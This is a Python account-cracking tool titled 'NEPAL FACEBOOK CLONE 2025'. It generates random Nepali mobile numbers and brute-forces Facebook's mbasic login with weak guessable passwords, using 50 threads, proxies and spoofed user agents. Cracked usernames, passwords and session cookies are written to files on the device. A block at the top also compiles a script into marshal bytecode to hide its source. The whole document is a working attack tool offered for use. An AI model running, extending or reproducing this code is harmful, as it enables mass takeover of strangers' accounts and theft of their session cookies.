# ------------------[ IMPORTS ]------------------#
import os
import sys
import re
import time
import requests
import random
import string
import json
import marshal
from concurrent.futures import ThreadPoolExecutor as ThreadPool

# ------------------[ MARSHAL SCRIPT ]------------------#
import marshal

# Set the input and output file names
input_file = "script.py"  # Your original script
output_file = "script.pyc"  # Encrypted output file

try:
    # Read the original script
    with open(input_file, "r", encoding="utf-8") as f:
        code = compile(f.read(), input_file, "exec")

    # Marshal and save the encrypted file
    with open(output_file, "wb") as f:
        f.write(marshal.dumps(code))

    print(f"[✓] Successfully marshaled! File saved as: {output_file}")

except Exception as e:
    print(f"[✗] Error: {e}")
# ------------------[ GLOBAL VARIABLES ]------------------#
oks = []
cps = []
loop = 0
proxy_list = []
ugen = []

# ------------------[ GENERATE USER AGENTS ]------------------#
def generate_user_agents():
    for i in range(10000):
        ua = f'Mozilla/5.0 (Linux; Android {random.randint(8,13)}; {random.choice(["Pixel 5", "Pixel 6 Pro", "Redmi Note 12 Pro", "Samsung Galaxy S21 Ultra"])}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(111,125)}.0.{random.randint(4000,6000)}.{random.randint(100,150)} Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/{random.randint(350,450)}.0.0.{random.randint(50,100)}]'
        ugen.append(ua)

# ------------------[ LOAD PROXIES ]------------------#
def load_proxies():
    try:
        with open('.proxy.txt', 'r') as f:
            return f.read().splitlines()
    except:
        print("[×] Proxy file not found! Please add proxies in '.proxy.txt'")
        return []

# ------------------[ CLEAR SCREEN ]------------------#
def clear():
    os.system('clear')
    print("""
███╗   ███╗███████╗██████╗  █████╗ ██╗     
████╗ ████║██╔════╝██╔══██╗██╔══██╗██║     
██╔████╔██║█████╗  ██████╔╝███████║██║     
██║╚██╔╝██║██╔══╝  ██╔═══╝ ██╔══██║██║     
██║ ╚═╝ ██║███████╗██║     ██║  ██║███████╗
╚═╝     ╚═╝╚══════╝╚═╝     ╚═╝  ╚═╝╚══════╝
       NEPAL FACEBOOK CLONE 2025 
    """)

# ------------------[ MENU ]------------------#
def menu():
    clear()
    print("[1] Nepal Random Clone (NTC / Ncell)")
    print("[0] Exit")
    choice = input("[?] Select option: ")
    if choice == '1':
        start_clone()
    elif choice == '0':
        exit()
    else:
        print("Invalid option!")
        menu()

# ------------------[ RANDOM NUMBER GENERATOR ]------------------#
def get_numbers(code, limit):
    return [code + ''.join(random.choice(string.digits) for _ in range(7)) for _ in range(limit)]

# ------------------[ PASSWORDS LIST ]------------------#
def password_list(uid):
    name_part = uid[-6:]
    return [
        uid, name_part, uid + '123', uid + '12345',
        name_part + '123', 'nepal123', 'nepal2025',
        '12345678', 'password123', uid + '@2025'
    ]

# ------------------[ LOGIN FUNCTION ]------------------#
def fb_login(uid, pwx, proxies):
    global oks, cps, loop
    session = requests.Session()
    proxy_setup = {"http": f"http://{random.choice(proxies)}", "https": f"http://{random.choice(proxies)}"} if proxies else {}

    try:
        ua = random.choice(ugen)
        session.headers.update({
            "Host": "mbasic.facebook.com",
            "upgrade-insecure-requests": "1",
            "user-agent": ua,
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "accept-language": "en-US,en;q=0.5",
            "content-type": "application/x-www-form-urlencoded"
        })

        for pw in pwx:
            resp = session.get('https://mbasic.facebook.com/login.php', proxies=proxy_setup)
            lsd = re.search('name="lsd" value="(.*?)"', resp.text).group(1)
            jazoest = re.search('name="jazoest" value="(.*?)"', resp.text).group(1)

            data = {'lsd': lsd, 'jazoest': jazoest, 'email': uid, 'pass': pw, 'login': 'Log In'}
            res = session.post('https://mbasic.facebook.com/login.php', data=data, allow_redirects=False, proxies=proxy_setup)

            if 'c_user' in session.cookies.get_dict():
                cookie_string = "; ".join([f"{k}={v}" for k, v in session.cookies.get_dict().items()])
                print(f"[OK] {uid} | {pw} | Cookies: {cookie_string}")
                oks.append(uid)
                with open('/sdcard/NEPAL_OK.txt', 'a') as f: f.write(f"{uid}|{pw}\n")
                with open('/sdcard/NEPAL_OK_COOKIES.txt', 'a') as f: f.write(f"{uid}|{pw}|{cookie_string}\n")
                break
            elif 'checkpoint' in session.cookies.get_dict():
                print(f"[CP] {uid} | {pw}")
                cps.append(uid)
                with open('/sdcard/NEPAL_CP.txt', 'a') as f: f.write(f"{uid}|{pw}\n")
                break
            else:
                continue

        loop += 1
        sys.stdout.write(f'\r[LOOP {loop}] OK:{len(oks)} CP:{len(cps)} ')
        sys.stdout.flush()

    except Exception as e:
        pass

# ------------------[ START CLONE FUNCTION ]------------------#
def start_clone():
    clear()
    generate_user_agents()
    proxies = load_proxies()

    sim_code = input("[?] Enter SIM code (e.g., 980, 981, 984, 986, 974, 976): ")
    limit = min(int(input("[?] Enter limit (up to 100000 recommended): ")), 100000)
    ids = get_numbers(sim_code, limit)

    print(f"\n[+] Total numbers collected: {len(ids)}")
    print("[+] Start cracking...\n")

    with ThreadPool(max_workers=50) as pool:
        for uid in ids:
            pool.submit(fb_login, uid, password_list(uid), proxies)

    print("\n[+] Cracking complete.")
    print(f"[+] Total OK: {len(oks)} | CP: {len(cps)}")
    input("Press Enter to back to menu")
    menu()

# ------------------[ RUN SCRIPT ]------------------#
if __name__ == "__main__":
    menu()